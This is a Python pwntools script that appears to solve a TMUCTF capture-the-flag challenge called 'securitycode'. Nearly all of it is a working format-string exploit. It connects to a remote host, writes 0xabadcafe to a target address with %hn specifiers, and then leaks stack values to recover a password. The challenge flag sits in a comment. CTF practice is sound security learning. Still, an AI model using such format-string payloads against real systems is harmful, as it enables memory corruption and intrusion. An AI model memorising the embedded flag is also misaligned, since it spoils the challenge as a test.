from pwn import *
import sys

# TMUCTF{50_y0u_kn0w_50m37h1n6_4b0u7_f0rm47_57r1n6_0xf7e11340}

target_addr = 0x804c03c
value = 0xabadcafe
host, port = '185.235.41.205', 7040
p = remote(host, port)
# p = process('./securitycode')

p.sendline(b'A')

# payload = b''
# payload += p32(target_addr)
# payload += p32(target_addr + 2)
# payload += b'AAAA'
# payload += b'%51954x'
# payload += b'%15$hn'
# payload += b'%57519x'
# payload += b'%16$hn'

payload = b''
payload += p32(target_addr + 2)
payload += p32(target_addr)
payload += b'AAAA'
payload += b'%43937x'
payload += b'%15$hn'
payload += b'%8017x'
payload += b'%16$hn'

payload += b'X' * (1022 - len(payload))

p.sendline(payload)
p.recvuntil(b'your password: ')

p.sendline(f'%{sys.argv[1]}$x'.encode())
p.recvuntil(b'password is ')
print(p.recv().strip())

p.close()
